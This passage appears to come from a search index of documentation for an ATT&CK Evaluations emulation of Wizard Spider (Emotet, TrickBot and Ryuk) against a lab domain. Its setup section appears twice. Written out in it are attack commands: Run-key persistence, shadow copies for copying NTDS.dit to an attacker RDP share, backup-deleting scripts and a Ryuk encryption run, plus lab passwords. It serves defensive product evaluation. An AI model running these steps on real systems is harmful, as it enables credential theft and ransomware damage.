/u:oz\\\\vfleming /p:q27VYN8xflPcYumbLMit /v:10.0.0.4 /drive:X,wizard_spider/Resources/setup","Open Windows Defender, toggle all nobs to the off position. Also go to App and Browser control and turn off Smart Screen.","Open PowerShell being sure to select \"Run as Administrator\":","Next we need to download Microsoft Visual C++ Redistributable. Open FireFox; close all spurious prompts / decline everything.","Go to the following page:","https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0","Download and install the 32-bit and 64-bit versions.","Reboot the workstation Restart-Computer -Force"]},{"i":"dorothy--10007-setup","l":"Dorothy / 10.0.0.7 Setup","p":["Close Word and outlook.","Configure Outlook and office?","Download and install the 32-bit and 64-bit versions.","For local testing:","Go to this page:","https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0","Log back into Dorothy as user judy","Next we need to download Microsoft Visual C++ Redistributable.","Open an Administrator CMD.exe","Open Edge; close all spurious prompts / decline everything.","Open PowerShell being sure to select \"Run as Administrator\":","Open Windows Defender, toggle all nobs to the off position.","Open Word and Outlook; surpress all spurious prompts.","RDP into Dorothy","Reboot the workstation","Run this command to take ownership of a privileged directory:","Sign out of the RDP session."]},{"i":"configure-toto--10008","l":"Configure Toto / 10.0.0.8","p":["RDP into Toto","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Reboot the workstation"]},{"l":"Network Diagram","p":["A network diagram is available here that displays the domains and infrastructure that was used to support the setup and execution of the Emulation plan. Infrastructure Image"]}],[{"i":"scenario-overview-protections","l":"Scenario Overview (Protections)","p":["This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).","This scenario emulates Wizard Spider TTPs based on several malware specimens either used by or associated with the Wizard Spider actors:","Emotet","Trickbot","Ryuk","The steps in this scenario are grouped to support Protections Evaluations.","Wizard Spider Protections Diagram"]},{"i":"test-1-steps-1-3","l":"Test 1 (steps 1-3)"},{"i":"step-1---initial-compromise","l":"Step 1 - Initial Compromise","p":["\uD83C\uDFA4 Voice Track:","Step1 emulates Wizard Spider gaining initial access using a Microsoft Word document.","The word document contains obfuscated VBA macros that downloads and executes a malicious DLL.","The malicious DLL establishes a C2 session with the adversary control server.","The malicious DLL is based on Emotet.","Note: the document is pre-positioned in the environment.","We do not emulate sending the document to target, as our focus is evaluating their product against post-initial-access TTPs."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Upload the Emotet-dropper document to Dorothy's desktop:","Start the control server from your terminator terminal.","Open a new terminal tab (ctrl-shift-T); double click the terminal tab and rename it to \"RDP to Dorothy\"","RDP into Dorothy / 10.0.0.7 as user Judy:","Open outlook if its not already open, log in to Office account if not already logged in","Open the ChristmasCard.docm document on the desktop; enable macros when prompted.","You should see a terminal flash; wait for it to execute the Emotet DLL.","Go back to your control server tab; you should have a new callback.","Take a screenshot of your new session, and paste in the vendor slack channel.","Source Code - Dropper Word Document","Source Code - Emotet DLL","For testing without MS Office; be aware that this is not identical to the Word document implementation - the process lineage and file paths change significantly with this method.","Open PowerShell and run:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf","https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor","https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html","https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/","https://blog.talosintelligence.com/2019/01/return-of-emotet.html"]},{"i":"step-2---emotet-persistence","l":"Step 2 - Emotet Persistence","p":["\uD83C\uDFA4 Voice Track:","Wizard Spider establishes registry persistence by adding the registry key:","The registry key is written using the RegSetValueExA WinAPI function."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Open a horizontal terminal tab (right-click split horizontally).","Copy/paste the command in your lower terminal tab:","Source Code"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/","https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor","https://www.us-cert.gov/ncas/alerts/TA18-201A","https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html"]},{"i":"step-3---emotet-host-discovery-and-credential-collection","l":"Step 3 - Emotet Host Discovery and Credential Collection","p":["\uD83C\uDFA4 Voice Track:","Wizard Spider first enumerates local processes using WinAPI functions: CreateToolhelp32Snapshot and Process32First.","Wizard Spider then downloads and loads an Outlook scraper DLL using the LoadLibraryW and GetProcAddress functions.","Lastly, Wizard Spider executes the Outlook-scraper to dump emails and contacts.","One of the emails contains credentials for another user, bill@oz.local, which will be used in the next step.","Download Info:"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Enumerate processes.","Source Code","Download Outlook Scraper DLL from C2 channel (192.168.0.4:80 / HTTP) to current working directory.","Load Outlook Scraper DLL into emotet's address space via call to LoadLibraryW() and GetProcAddress().","Scrape email content from Outlook inbox via _ popen call to PowerShell.","_popen info, because I've never heard of it either","Scrape email addresses from inbox.","â ï¸ Sign out of RDP session: Right-click Windows icon - Shut down or sign out - Sign out"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://unit42.paloaltonetworks.com/emotet-command-and-control/","https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/","https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/","https://global.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.88_ENG.pdf"]},{"i":"test-2-steps-4-6","l":"Test 2 (Steps 4-6)"},{"i":"step-4---move-laterally-deploy-trickbot","l":"Step 4 - Move Laterally Deploy TrickBot","p":["\uD83C\uDFA4 Voice Track:","During this step, Wizard Spider uses bill's credentials to RDP into Toto.","Wizard Spider uploads and executes a malicious EXE based on TrickBot.","Trickbot is uploaded to target using an RDP-mounted network share.","Once executed, Trickbot calls back to the C2 server over HTTP."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Change your RDP tab name to \"RDP into Toto\"","RDP into Toto and create RDP drive that has TrickBot folder structure","Open CMD.exe and copy file to bill's AppData\\Roaming","â ï¸ make sure you're in a CMD shell","Kick off exeuction by starting TrickBotClientExe.exe"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://attack.mitre.org/groups/G0102/","https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"]},{"i":"step-5---trickbot-discovery","l":"Step 5 - TrickBot Discovery","p":["\uD83C\uDFA4 Voice Track:","In step 5 Wizard Spider uses TrickBot to perform detailed system discovery.","You will see TrickBot executing shell commands, such as systeminfo, sc.exe, net.exe, and so on.","Trickbot executes commands via the C standard library function, system()."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Switch back to your C2 terminal window.","Execute the following commands."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf","https://www.fidelissecurity.com/threatgeek/2016/10/trickbot-we-missed-you-dyre","https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/","https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware","https://eclypsium.com/wp-content/uploads/2020/12/TrickBot-Now-Offers-TrickBoot-Persist-Brick-Profit.pdf"]},{"i":"step-6---kerberoast-the-dc","l":"Step 6 - Kerberoast the DC","p":["\uD83C\uDFA4 Voice Track:","In this step Wizard Spider performs Kerberoasting using a public tool, Rubeus.","Through Kerberoasting, Wizard Spider obtains encrypted credentials for the domain admin, vfleming.","Wizard Spider cracks the credentials offline for use in the next step.","Note: offline cracking isn't performed due to time constraints; its also not in scope for the evaluation, so we skip the behavior."]},{"i":"procedures","l":"â£ï¸ Procedures"},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/"]},{"i":"test-3-step-7","l":"Test 3 (Step 7)"},{"i":"step-7---lateral-movement-to-dc","l":"Step 7 - Lateral Movement to DC","p":["\uD83C\uDFA4 Voice Track:","In step 7 Wizard Spider RDP's into the domain controller as user vfleming.","Wizard Spider dowloads a TrickBot variant to the DC using PowerShell's Invoke-WebRequest command.","Wizard Spider then establishes registry persistence to execute Trickbot when vflemming logs in.","Lastly, Wizard Spider enumerates the domain using the adfind utility."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Go back to your Toto RDP session and sign out: Right-click Windows icon - Shut down or sign out - Sign out","Rename your RDP terminal to \"RDP to wizard\"","RDP to wizard / 10.0.0.4.","â ï¸ Open an administrator powershell.","Download a trickbot variant (same binary with a zero appended to the very end)"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html","https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html","https://thedfirreport.com/2020/10/08/ryuks-return/","https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/"]},{"i":"test-4-step-8","l":"Test 4 (Step 8)"},{"i":"step-8---dump-active-directory-database-ntdsdit","l":"Step 8 - Dump Active Directory Database (ntds.dit)","p":["\uD83C\uDFA4 Voice Track:","During step 8, Wizard Spider creates a volume shadow copy in order to collect the active directory database (ntds.dit).","Wizard Spider uses vssadmin to create the shadow copy.","Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Spawn a CMD shell within your PowerShell window:","You will get output resembling the following:","â ï¸ Make sure the \\\\\\\\?\\GLOBALROOT...HarddiskVolumeShadowCopy1 path matches your output!","Notionally, Wizard Spider carves credentials offline from ntds.dit using tools like Impacket's secretsdump.py"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"]},{"i":"test-5-step-9","l":"Test 5 (Step 9)"},{"i":"step-9---ryuk-inhibit-system-recovery","l":"Step 9 - Ryuk Inhibit System Recovery","p":["\uD83C\uDFA4 Voice Track:","In step 9, Wizard Spider prepares to deploy an executable based on the Ryuk ransomware.","At the beginning of this step, Wizard Spider mounts the C$ share of a lateral host, toto / 10.0.0.8.","Files on Toto will be encrypted in the next step.","Next, Wizard Spider uploads two files to disk: kill.bat and window.bat.","These files are used to stop specific services and delete backups prior to encrypting the system."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["In the CMD session, mount share so Ryuk can encrypt lateral drives:","Source Code"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/","https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf"]},{"i":"test-6-step-10","l":"Test 6 (Step 10)"},{"i":"step-10---ryuk-encryption-for-impact","l":"Step 10 - Ryuk Encryption for Impact","p":["\uD83C\uDFA4 Voice Track:","In our final test, Wizard Spider uploads and executes Ryuk.","Ryuk is uploaded using the RDP-mounted network share, and executed from CMD.","When Ryuk executes, it will first gain SeDebugPrivilege.","Ryuk will then and inject its own executable into a remote process,notepad.exe, via WriteProcessMemory and CreateRemoteThread WinAPI calls.","From the remote process, Ryuk will encrypt files on wizard/10.0.0.4's C:\\Users\\Public directory (recursive).","Next, Ryuk encrypts files on Toto/10.0.0.8 at \\C$\\Users\\Public (mounted on wizard as Z:).","Ryuk uses a symmetric key algorithm, AES256 to encrypt files.","Note that the symmetric key is itself encrypted with RSA2048.","Note: early versions of our Ryuk emulation encrypted the entire filesystem; however, this proces took hours, rather than minutes, so we scaled it back due to time constraints."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From the pre-existing CMD session, run the following:","To confirm that encryption worked, execute the following in CMD:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/"]}],[{"l":"Scenario 1 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by Wizard Spider. Scenarios 1 and 2 share the same infrastructure; however, Scenario 1 was built to exercise detective-only security controls, and thus protective security controls are to be disabled to complete the evaluation. Scenario 2 was built to exercise protective security controls, which may be enabled while completing the evaluation.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating Wizard Spider to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\" We provide a script to automatically decrypt these files:","Note, there is no change of infrastructure between Scenario 1 and Scenario 2."]},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: tested and executed on Kali Linux 2019.1","PAExec","pyyaml","Rubeus","Mimikatz","FreeRDP"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4"]},{"l":"A note about red team payloads","p":["This evaluation utilizes a combination of modified open-source and custom utilities that are representative of Ryuk ransomeware.","These utilities include credential dumpers, variants of process injection techniques, and file encryption.","Some pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4."]},{"l":"Linux Attack Platform Setup","p":["Download the wizard_spider repository to the home directory"]},{"l":"Target Infrastructure","p":["3 targets, all domain joined:","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763.","User machine 1: tested and executed on Windows 10 - Build 19042.","User machine 2: tested and executed on Windows 10 - Build 19042."]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP Address","Domain Controller","wizard","10.0.0.4","User machine 1","dorothy","10.0.0.7","User machine 2","Toto","10.0.0.8"]},{"l":"Domain Controller Setup","p":["RDP into domain controller","xfreerdp +clipboard /u:oz\\\\vfleming /p:q27VYN8xflPcYumbLMit /v:10.0.0.4 /drive:X,wizard_spider/Resources/setup","Open Windows Defender, toggle all nobs to the off position. Also go to App and Browser control and turn off Smart Screen.","Open PowerShell being sure to select \"Run as Administrator\":","Next we need to download Microsoft Visual C++ Redistributable. Open FireFox; close all spurious prompts / decline everything.","Go to this page:","https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0","Download and install the 32-bit and 64-bit versions.","Reboot the workstation Restart-Computer -Force"]},{"i":"dorothy--10007-setup","l":"Dorothy / 10.0.0.7 Setup","p":["Close Word and outlook.","Configure Outlook and office?","Download and install the 32-bit and 64-bit versions.","For local testing:","Go to the following URL:","https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0","Log back into Dorothy as user judy","Next we need to download Microsoft Visual C++ Redistributable.","Open an Administrator CMD.exe","Open Edge; close all spurious prompts / decline everything.","Open PowerShell being sure to select \"Run as Administrator\":","Open Windows Defender, toggle all nobs to the off position.","Open Word and Outlook; suppress all spurious prompts.","RDP into Dorothy","Reboot the workstation","Run this command to take ownership of a privileged directory:","Sign out of the RDP session."]},{"i":"configure-toto--10008","l":"Configure Toto / 10.0.0.8","p":["RDP into Toto","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Reboot the workstation"]},{"l":"Network Diagram","p":["A network diagram is available here that displays the domains and infrastructure that was used to support the setup and execution of the Emulation plan. Infrastructure Image"]}],[{"l":"DEPENDENCIES"},{"l":"CALDERA C2 Server","p":["Linux/Mac OS, 64-bit","git commandline installed","python3.7+ with pip3","python3.9+ recommended","golang 1.17+","required for dynamic agent compilation"]},{"l":"Attacker Machine Dependencies","p":["Linux OS, 64-bit","Kali recommended","Can be the same machine as the CALDERA C2 server if needed.","command-line tools","xfreerdp","xdotool","smbclient"]},{"l":"Target Machine Dependencies","p":["On the initial target, Outlook will be used for certain TTPs. Thus, a valid Outlook license will be required, and the initial target machine should have the user already open and log into Outlook prior to executing this scenario."]},{"l":"SETUP"},{"l":"Download and Install CALDERA","p":["Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server.","Add the emu plugin add emu to your conf/local.yml configuration file. Feel free to enable or disable other plugins by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.","Download pip dependencies.","Run your C2 server."]},{"l":"RUNNING THE OPERATION"},{"l":"Launch Agent on Attacker-controlled Kali Machine","p":["We recommend using a different Kali linux machine to run the Kali agent since RDP windows will need to be in the forefront when performing certain automated keystrokes. Thus, in order to avoid disrupting automated RDP keystrokes, it's best to run the Kali agent on a machine different from the C2 server. If you plan on using the same Kali machine to run the C2 server and the kali agent, make sure not to type or click around when performing RDP-related abilities.","Launch the agent by running the following command on the (preferably remote) Kali machine:","Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is red, default password is admin).","Make sure you can see your kali agent after clicking the agents option on the menu on the left, under \"Campaigns\".","For best results, make sure you don't have other agents currently beaconing in."]},{"l":"Fact Setup","p":["Before running the operation, you will need to make sure that the Wizard Spider fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select Wizard Spider (Emu), which is the fact source for the Wizard Spider adversary. From there, update the following facts as needed:","ad.domain.name: this is the short-hand domain name (not the fully-qualified domain) for your Active Directory environment. For instance, if your usernames look like DOMAINNAME\\Username, then you will want your fact value to be DOMAINNAME.","ad.domain.full_name: this will be the fully qualified domain name (e.g. oz.local) for your Active Directory environment.","initial.target.host: the IPv4 address or hostname of the initial target for the operation. This will have to be a Windows machine connected to your Active Directory environment.","initial.user.name: the username (without the domain portion) that will be used to log into the initial target.","initial.user.password: the password of the initial user.","second.target.host: the IPv4 address or hostname of the second target for the operation. This will have to be a Windows machine connected to your Active Directory environment.","second_host.user.name: the username (without the domain portion) that will be used to log into the second target.","second_host.user.password: the password of the second target user.","dc.target.host: the IPv4 address or hostname of the Domain Controller for your AD environment.","domain.admin.name: username (without the domain portion) of the domain admin.","domain.admin.password: domain admin's password."]},{"l":"Operation Setup","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select Wizard Spider.","For the Fact Source, select Wizard Spider (Emu).","For the Parser, select \"Do not user default parsers\".","For the Planner, select Wizard Spider Planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation and enter the cleanup stage."]},{"l":"Cleanup","p":["terminate agents from the GUI, or RDP into the 3 target machines to stop the agent processes","RDP into first lat movement target and remove %AppData%\\uxtheme.exe","from the Kali agent's directory, remove the ws_tools directory after extracting exfiltrated files.","Run cleanup scripts from cleanup on the corresponding hosts to cover any automated cleanup actions that failed and to handle cleanup actions that aren't included in the CALDERA abilities."]},{"i":"modificationsdeviations-from-the-original-emulation-plan","l":"MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN","p":["When performing RDP connections with shared drives, some of the local file paths on the attacker machine are adjusted for more flexibility, since agents may be started from various directories on the local file system. The overall functionality remains the same.","Note that when the operation terminates, the agents running on the various targets will perform various cleanup tasks in order to revert certain changes, such as file downloads and registry writes. These are not part of the actual evaluation. The following cleanup actions are taken:","The agent running on the attacker-controlled Kali machine will delete the compiled agent binaries ChristmasCard.exe and TrickBotClientExe.exe in its local directory.","The agent running on the initial target will remove the registry key persistence via: reg.exe delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v blbdigital /f","The agent running on the initial target will delete the downloaded Outlook scraper DLL file at C:\\Windows\\SysWOW64\\Outlook.dll.","The agent running on the first lateral movement target will delete the discovery.txt file generated during step 5.","The agent running on the domain controller will undo the registry persistence via the powershell command: Remove-ItemProperty HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ Userinit -Force","The agent running on the domain controller will unmount the Z: drive and will remove the following downloaded files if they still exist on the file system:","C:\\Users\\Public\\kill.bat","C:\\Users\\Public\\window.bat","C:\\Users\\Public\\ryuk.exe"]},{"l":"Step 1","p":["Initial access will be performed by running a CALDERA agent executable (.exe file) rather than a malicious word document with VBA macros.","The agent will act as the remote access implant and will replace the Emotet-based agent from evals.","The agent is a compiled .exe written in Golang, whereas the original evals agent was run via a DLL.","The agent executable will be uploaded to the initial target using smbclient at the user's desktop, similar to what was done with the original .docm file.","To emulate user execution of the file, an agent running on an attacker-controlled machine will run xfreerdp to connect to the initial target. xdotool will be used to send automated keystrokes to open the uploaded file via explorer.exe start menu, rather than double clicking it from the desktop.","Note that the agent executable will directly connect to the C2 server and does not act as a stager. No VBS script or DLL will be downloaded or executed as part of this process.","Note that since a malicious word document is not being used, winword.exe will not be executed. Rather, the agent executable will be executed directly.","Note that agent-server communication will be in unencrypted by default unless CALDERA is run using the ssl plugin and is listening on an HTTPS socket.","Note that the agent will connect to the C2 server using the pre-configured port from the CALDERA configuration file (default 8888), and so the port numbers may differ from what was used in evals."]},{"l":"Step 2","p":["Instead of using the RegSetValueExA WinAPI function, the CALDERA agent will run reg.exe via cmd to perform the registry write.","Command: reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v blbdigital /t REG_SZ /d %userprofile%\\Ygyhlqt\\Bx5jfmo\\R43H.dll,Control_RunDLL"]},{"l":"Step 3","p":["Instead of performing API calls for System Information Discovery and Process Discovery, the agent will execute the following processes:","systeminfo.exe is executed instead of the API calls RtlGetVersion, GetNativeSystemInfo, and RtlGetNtProductType","tasklist.exe is executed instead of the API call CreateToolhelp32Snapshot","Outlook scraper DLL download modifications","The file will be initially be written to disk at the agent's current working directory as OutlookScraper.dll and then moved to C:\\Windows\\SysWOW64\\Outlook.dll via cmd.","Due to CALDERA's C2 infrastructure, the URL endpoint for the file download will be /file/download rather than /modules","The HTTP request will be performed via HTTP POST rather than HTTP GET","The HTTP request will include extra HTTP headers specifying the file name file:OutlookScraper.dll and agent operating system platform:windows, as well as the unique agent identifier","The agent uses GoLang's net/http library rather than WinHttp API calls","A different user agent string will be used","Download will be done over HTTP by default, unless CALDERA is configured to run over HTTPS using the ssl plugin.","The CALDERA agent will not load the Outlook DLL in memory or call the DLL functions, but will instead directly run the PowerShell commands that the DLL functions would have run. The agent will call PowerShell directly rather than via cmd or by loading the DLL."]},{"l":"Step 4","p":["Lateral movement will be performed by running a CALDERA agent executable (.exe file) rather than the actual TrickBotClientExe.exe used in evals.","The agent will act as the remote access implant and will replace the TrickBot-based malware from evals.","To emulate the ingress tool transfer of the file over RDP, an agent running on an attacker-controlled machine will run xfreerdp to connect to the initial target. xdotool will be used to send automated keystrokes to open cmd.exe, copy the agent executable over the shared drive, and execute it from cmd.","Note that agent-server communication will be in unencrypted by default unless CALDERA is run using the ssl plugin and is listening on an HTTPS socket.","Note that the agent will connect to the C2 server using the pre-configured port from the CALDERA configuration file (8888 by default), and so the port numbers may differ from what was used in evals."]},{"l":"Step 5","p":["Instead of using the C standard library function system() to execute commands, the CALDERA agent will spawn a separate cmd process to run each command."]},{"l":"Step 6","p":["Instead of using API calls, the agent will download rubeus.exe over the HTTP(S) C2 channel.","Due to CALDERA C2 infrastructure, the URL endpoint for the file download will be /file/download rather than /camp1/...","The HTTP request will be performed via HTTP POST rather than HTTP GET.","The HTTP request includes extra HTTP headers specifying the file name file:rubeus.exe, agent operation system platform:windows, and unique agent identifier.","Uses Golang's net/http library instead of WinHttp API calls","Due to predefined agent behavior, the rubeus.exe payload will be deleted automatically after the CALDERA agent performs this step."]},{"l":"Step 7","p":["Lateral movement will be performed by running a CALDERA agent executable (.exe file) rather than the actual uxtheme.exe malware used in evals.","The agent will act as the remote access implant and will replace the uxtheme.exe malware from evals.","To emulate the ingress tool transfer of the file over RDP, an agent running on an attacker-controlled machine will run xfreerdp to connect to the domain controller. xdotool will be used to send automated keystrokes over RDP to open an administrator PowerShell session, download a dynamically compiled agent executable from the CALDERA C2 server, and execute it via the PowerShell console.","Note that the PowerShell commands for the HTTP request were modified in the following ways:","Due to CALDERA's C2 infrastructure, the URL endpoint for the file download will be /file/download rather than /getFile/uxtheme.exe","The HTTP request will be performed via HTTP POST rather than HTTP GET","The HTTP request will include extra HTTP headers specifying the agent file name ( sandcat.go), agent operating system ( windows), and agent group ( wizard)","the compiled agent binary will have a different hash but overall same functionality as previous agents","The new powershell commands to download and execute the binary look like the following:","While uxtheme.exe was not executed on the domain controller during the actual evaluation, the agent executable will be executed here to allow the remaining steps to be executed in an automated manner without having to send everything over automated RDP keystrokes.","Agent-server communication will be in unencrypted by default unless CALDERA is run using the ssl plugin and is listening on an HTTPS socket.","Note that the agent will connect to the C2 server using the pre-configured port from the CALDERA configuration file (8888 by default), and so the port numbers may differ from what was used in evals.","The agent executable running on the domain controller will spawn a separate PowerShell process to perform registry persistence.","The agent executable running on the domain controller will spawn a separate PowerShell process to execute adfind."]},{"l":"Step 8","p":["The agent on the domain controller will spawn a separate PowerShell process to run the following via separate cmd process:","cmd /c vssadmin.exe create shadow /for=C:","The shadow copy path will typically look like \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1, but the final number may differ depending on the environment and if previous shadow copies have been created. To account for differing names, CALDERA will parse out the shadow copy path and save it for the upcoming exfiltration.","The agent on the domain controller will spawn a separate PowerShell process to run the following via separate cmd processes:","cmd /c copy #{vssadmin.shadow_copy.name}\\Windows\\NTDS\\NTDS.dit \\\\TSCLIENT\\X\\ntds.dit","cmd /c copy #{vssadmin.shadow_copy.name}\\Windows\\System32\\config\\SYSTEM \\\\TSCLIENT\\X\\VSC_SYSTEM_HIVE","Note that #{vssadmin.shadow_copy.name} represents the saved shadow copy path (e.g \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1)","cmd /c reg SAVE HKLM\\SYSTEM \\\\TSCLIENT\\X\\SYSTEM_HIVE"]},{"l":"Step 9","p":["The agent on the domain controller will spawn a separate PowerShell process to run the following via separate cmd processes:","cmd /c net use Z: \\\\#{second.target.host}\\C$, where #{second.target.host} is the IP address or hostname of the first lateral movement target.","cmd /c copy \\\\TSCLIENT\\X\\kill.bat C:\\Users\\Public\\kill.bat","The agent on the domain controller will spawn a separate PowerShell process to run the following via a separate cmd process:","cmd /c C:\\Users\\Public\\kill.bat 2 $null; exit 0;","Due to the way CALDERA handles commands with error messages and non-0 exit codes, the above PowerShell command has to suppress error output and force exit with the successful (0) exit code.","cmd /c copy \\\\TSCLIENT\\X\\window.bat C:\\Users\\Public\\window.bat","cmd /c C:\\Users\\Public\\window.bat 2 $null; exit 0;"]},{"l":"Step 10","p":["The agent on the domain controller will spawn a separate PowerShell process to run the following via a separate cmd process:","cmd /c copy \\\\TSCLIENT\\X\\ryuk.exe C:\\Users\\Public\\ryuk.exe","The agent on the domain controller will spawn a separate PowerShell process to do the following:","Start a background notepad process via: Start-Process C:\\Windows\\System32\\notepad.exe;","Run ryuk.exe via separate cmd process: cmd /c C:\\Users\\Public\\ryuk.exe --encrypt --process-name notepad.exe;"]}],[{"l":"Resources","p":["The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Documentation for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["Binaries","CHANGELOG","cleanup","control_server","Emotet","Emotet_Dropper","Infrastructure Setup","Mimikatz","README","README_original","Rubeus","Ryuk","Telemetry_Generator","TrickBot","troubleshooting","Utilities"]}],[{"i":"attck-evaluations-control-server","l":"ATT&CK Evaluations Control Server","p":["This ATT&CK Evaluations Control Server is used to execute behaviors under test during ATT&CK Evaluations.","The Control Server provides features for generating implant stagers, controlling agents, and executing modules.","The Control Server is backed with a REST API to support automation and integration with other tools."]},{"l":"Build from source"},{"l":"Test Instructions"},{"l":"Usage Examples","p":["Start the control server:","Alternatively run direct from source:"]},{"l":"Installation Dependencies","p":["Install Go version 1.15 or 